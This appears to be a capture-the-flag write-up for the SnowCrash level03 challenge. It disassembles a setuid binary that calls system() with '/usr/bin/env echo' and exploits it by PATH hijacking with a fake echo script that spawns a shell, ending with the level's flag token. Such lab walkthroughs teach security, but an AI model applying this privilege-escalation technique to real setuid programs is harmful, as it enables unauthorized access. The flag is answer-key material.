@@ -1,0 +1,96 @@
+# we get info on the file per;issions:
+level03@SnowCrash:~$ stat level03 
+  File: level03
+  Size: 8627            Blocks: 24         IO Block: 4096   regular file
+Device: 10h/16d Inode: 11161       Links: 1
+Access: (6755/-rwsr-sr-x)  Uid: ( 3003/  flag03)   Gid: ( 2003/ level03)
+Access: 2016-03-05 14:58:27.000000000 +0100
+Modify: 2016-03-05 14:58:27.000000000 +0100
+Change: 2024-01-22 12:32:22.955803004 +0100
+ Birth: -
+
+#Owner is flag03
+# we use gdb to see what the executable do:
+level03@SnowCrash:~$ gdb -q level03 
+Reading symbols from /home/user/level03/level03...done.
+(gdb) set disassembly-flavor intel
+(gdb) b main
+Breakpoint 1 at 0x80484ad: file /home/user/level03/level03.c, line 11.
+(gdb) r
+Starting program: /home/user/level03/level03 
+
+Breakpoint 1, main (argc=1, argv=0xbffff7c4, envp=0xbffff7cc)
+    at /home/user/level03/level03.c:11
+11	/home/user/level03/level03.c: No such file or directory.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484a4 <+0>:	push   ebp
+   0x080484a5 <+1>:	mov    ebp,esp
+   0x080484a7 <+3>:	and    esp,0xfffffff0
+   0x080484aa <+6>:	sub    esp,0x20
+=> 0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
+   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x18],eax
+   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
+   0x080484bb <+23>:	mov    DWORD PTR [esp+0x1c],eax
+   0x080484bf <+27>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484c3 <+31>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484c7 <+35>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484cb <+39>:	mov    DWORD PTR [esp+0x4],eax
+   0x080484cf <+43>:	mov    eax,DWORD PTR [esp+0x18]
+   0x080484d3 <+47>:	mov    DWORD PTR [esp],eax
+   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
+   0x080484db <+55>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x080484df <+59>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484e3 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x080484e7 <+67>:	mov    DWORD PTR [esp+0x4],eax
+   0x080484eb <+71>:	mov    eax,DWORD PTR [esp+0x1c]
+   0x080484ef <+75>:	mov    DWORD PTR [esp],eax
+   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
+   0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
+   0x080484fe <+90>:	call   0x80483b0 <system@plt>
+   0x08048503 <+95>:	leave  
+   0x08048504 <+96>:	ret    
+End of assembler dump.
+
+#This address looks like a string is being loaded in esp just before a call to system:
+(gdb) x/s 0x80485e0
+0x80485e0:	 "/usr/bin/env echo Exploit me"
+
+#we use strace to see the syscall:
+strace ./level03
+...
+getegid32()                             = 2003
+geteuid32()                             = 2003
+setresgid32(2003, 2003, 2003)           = 0
+setresuid32(2003, 2003, 2003)           = 0
+...
+#we use id to compare:
+$ id
+uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
+
+
+#So we have a successful call to setresgid32 and setresuid32 with parameter of user level03 of group level03
+#from the man:
+#setresuid() sets the real user ID, the effective user ID, and the
+       saved set-user-ID of the calling process.
+
+       An unprivileged process may change its real UID, effective UID,
+       and saved set-user-ID, each to one of: the current real UID, the
+       current effective UID, or the current saved set-user-ID.
+#and also, a system call that uses /usr/bin/env to call echo
+#We can customize PATH in env to include a path to our own echo, this is path injection
+level03@SnowCrash:~$ ./level03 
+Exploit me
+
+level03@SnowCrash:~$ mkdir /tmp/foo # build custom directory
+
+level03@SnowCrash:~$ echo /bin/sh > /tmp/foo/echo # create echo file that will launch /bin/sh
+
+level03@SnowCrash:~$ chmod 755 /tmp/foo/echo # executable
+level03@SnowCrash:~$ PATH=/tmp/foo:$PATH # export our path
+level03@SnowCrash:~$ /home/user/level03/level03 # Execute level03
+$ id # check id and we are user flag03 !
+uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
+$ getflag
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
